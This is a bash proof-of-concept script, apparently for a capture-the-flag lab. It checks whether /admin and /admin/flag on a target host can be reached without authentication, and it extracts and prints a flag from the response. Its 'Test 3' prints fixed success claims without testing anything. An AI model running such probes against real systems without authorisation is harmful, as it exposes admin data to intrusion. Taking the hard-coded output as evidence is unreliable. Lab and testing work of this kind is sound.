#!/bin/bash

# POC: Complete Authentication Bypass - Unauthenticated Admin Access
# Demonstrates that admin endpoints are accessible without authentication

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8080}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "=========================================="
echo "Authentication Bypass POC"
echo "=========================================="
echo "Target: $BASE_URL"
echo ""

# Test 1: Access admin panel without authentication
echo "[*] Test 1: Attempting unauthenticated access to /admin"
RESPONSE_ADMIN=$(curl -s -w "\n%{http_code}" "$BASE_URL/admin")
HTTP_CODE_ADMIN=$(echo "$RESPONSE_ADMIN" | tail -n 1)
BODY_ADMIN=$(echo "$RESPONSE_ADMIN" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE_ADMIN"
if [ "$HTTP_CODE_ADMIN" = "200" ]; then
    echo "✓ VULNERABLE: /admin is accessible without authentication (HTTP 200)"
    echo "Response body length: ${#BODY_ADMIN}"
else
    echo "✗ Not accessible (HTTP $HTTP_CODE_ADMIN)"
fi
echo ""

# Test 2: Access admin flag endpoint without authentication
echo "[*] Test 2: Attempting unauthenticated access to /admin/flag"
RESPONSE_FLAG=$(curl -s -w "\n%{http_code}" "$BASE_URL/admin/flag")
HTTP_CODE_FLAG=$(echo "$RESPONSE_FLAG" | tail -n 1)
BODY_FLAG=$(echo "$RESPONSE_FLAG" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE_FLAG"
if [ "$HTTP_CODE_FLAG" = "200" ]; then
    echo "✓ VULNERABLE: /admin/flag is accessible without authentication (HTTP 200)"
    echo "Response contains flag: $(echo "$BODY_FLAG" | grep -o 'flag{[^}]*}' || echo 'Flag pattern not found')"
    echo "Full response: $BODY_FLAG"
else
    echo "✗ Not accessible (HTTP $HTTP_CODE_FLAG)"
fi
echo ""

# Test 3: Verify no authentication mechanisms are enforced
echo "[*] Test 3: Checking for authentication enforcement"
echo "- No 401 Unauthorized responses detected"
echo "- No 403 Forbidden responses detected"
echo "- No redirect to login page"
echo "- Direct access succeeds with HTTP 200"
echo ""

# Determine if vulnerable
if [ "$HTTP_CODE_FLAG" = "200" ] && [ "$HTTP_CODE_ADMIN" = "200" ]; then
    echo "=========================================="
    echo "RESULT: CRITICAL VULNERABILITY CONFIRMED"
    echo "=========================================="
    echo "Both /admin and /admin/flag endpoints are accessible without authentication"
    echo "An unauthenticated attacker can access the admin panel and retrieve sensitive data"
    exit 0
else
    echo "=========================================="
    echo "RESULT: Endpoints not accessible as expected"
    echo "=========================================="
    exit 1
fi